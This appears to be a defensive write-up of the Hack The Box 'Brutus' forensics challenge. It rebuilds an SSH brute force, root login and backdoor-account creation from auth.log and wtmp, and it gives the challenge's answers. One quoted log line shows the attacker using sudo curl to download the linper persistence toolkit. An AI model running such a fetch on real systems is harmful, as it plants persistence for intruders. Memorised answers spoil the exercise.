---
title: Brutus
slug: htb-brutus
date: 2026-08-21
image: brutus
platform: HackTheBox
os: Linux
difficulty: Very Easy
points: 195
tags: [hackthebox, sherlock, linux, very-easy, retired, dfir, linux-forensics, incident-response]
description: Linux DFIR with auth.log and wtmp: trace an SSH brute force, the attacker's session, the backdoor user they created and their sudo activity.
featured: false
---

# Scenario
A Confluence server was brute-forced over SSH. I get two artifacts from the box - its
`auth.log` and its `wtmp` file - and have to rebuild what the attacker did: where the brute
force came from, which account fell, what they did once inside and how they kept access.

---
# The artifacts

## auth.log
`auth.log` is where Linux records anything that needs authentication: SSH logins (sshd),
`su`/`sudo`, and cron jobs that authenticate. Every line has the same shape - timestamp,
host, the service and its PID, then a message saying who tried what, from where, and
whether it worked:
```text
Mar 10 10:23:45 exampleserver sshd[19360]: Failed password for invalid user admin from 192.168.1.101 port 22 ssh2
```
That one line tells me the date, the host (`exampleserver`), the service (`sshd`), the user
(`admin`, which doesn't exist) and the source IP. Brute forcing leaves hundreds of these.

## wtmp
`wtmp` (`/var/log/wtmp`) is a binary log of logins, logouts and reboots. `last` normally
reads it:
```text
sebh24   pts/0   192.168.1.100   Sat Mar 10 10:23 - 10:25  (00:02)
```
The key difference from `auth.log`: `auth.log` records when a password was **accepted**,
`wtmp` records when a **terminal session** was actually opened. They can be a second apart,
and the questions care about which is which.

## Reading wtmp with utmp.py
`last` and `utmpdump` can misread a `wtmp` taken from a machine with a different CPU
architecture, so the Sherlock ships `utmp.py`
([source](https://gist.github.com/4n6ist/99241df331bb06f393be935f82f036a5)) to decode it:
```bash
python3 utmp.py -o wtmp.out wtmp
```
`wtmp.out` is plain text. The fields that matter here are `User`, `Host` (the source IP),
`Line` (the tty) and `sec`, the timestamp.

!!! warning "Timezones"
    `utmp.py` prints `sec` in **my** system's timezone, not the server's. Every time I pull
    from it has to be converted to UTC before it goes in an answer.

---
# Questions

## 1. Which IP carried out the brute force?
Searching `auth.log` for `Failed password` and `Invalid user` shows a wall of attempts
from one address, several per second. No human types passwords that fast - it's a tool.

**Answer:** `65.2.161.68`

## 2. Which account did the attacker get into?
Next I looked for `Accepted password` from the same IP. There's one for `root` in the
middle of the brute force, and the session closes in the same second - the tool found the
password and moved on. The attacker had the most privileged account on the box.

**Answer:** `root`

## 3. When did the attacker log in manually (UTC)?
The password was accepted at 06:32:44 in `auth.log`, but the question wants the moment an
interactive terminal was opened, which is what `wtmp` records. In `wtmp.out` the root login
from `65.2.161.68` opens at 06:32:45. My machine is on EDT (checked with `timedatectl`), so
I converted that time to UTC.

**Answer:** `2024-03-06 06:32:45`

## 4. What session number was assigned to that login?
`systemd-logind` numbers each SSH session and logs it right after `session opened`:
```text
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
**Answer:** `37`

## 5. Which account did the attacker create for persistence?
Two minutes into the session, `auth.log` shows a new group and user being created, a
password set and the account details changed:
```text
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
```
**Answer:** `cyberjunkie`

## 6. Which MITRE ATT&CK sub-technique is that?
Creating an account for persistence is [T1136 - Create Account](https://attack.mitre.org/techniques/T1136/)
under Persistence. It splits into local, domain and cloud accounts; `cyberjunkie` was made
with `useradd` on the host itself, so it's the local one:
[T1136.001](https://attack.mitre.org/techniques/T1136/001/).

**Answer:** `T1136.001`

## 7. When did the attacker's first SSH session end?
Following session 37 from question 4 to its end:
```text
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```
**Answer:** `2024-03-06 06:37:24`

## 8. What did the attacker download with sudo?
The attacker came back as `cyberjunkie` and used sudo to pull a script from GitHub.
`sudo` logs the full command line:
```text
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
`linper` is a Linux persistence toolkit - they were setting up more ways back in.

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---
# Timeline

| Time (UTC, Mar 6 2024) | Event |
| --- | --- |
| before 06:32 | SSH brute force from `65.2.161.68` |
| 06:32:44 | Password for `root` accepted, session 37 |
| 06:32:45 | Interactive terminal opened (`wtmp`) |
| 06:34:18 | Backdoor user `cyberjunkie` created |
| 06:37:24 | Session 37 ends |
| 06:39:38 | `cyberjunkie` downloads `linper.sh` with sudo |
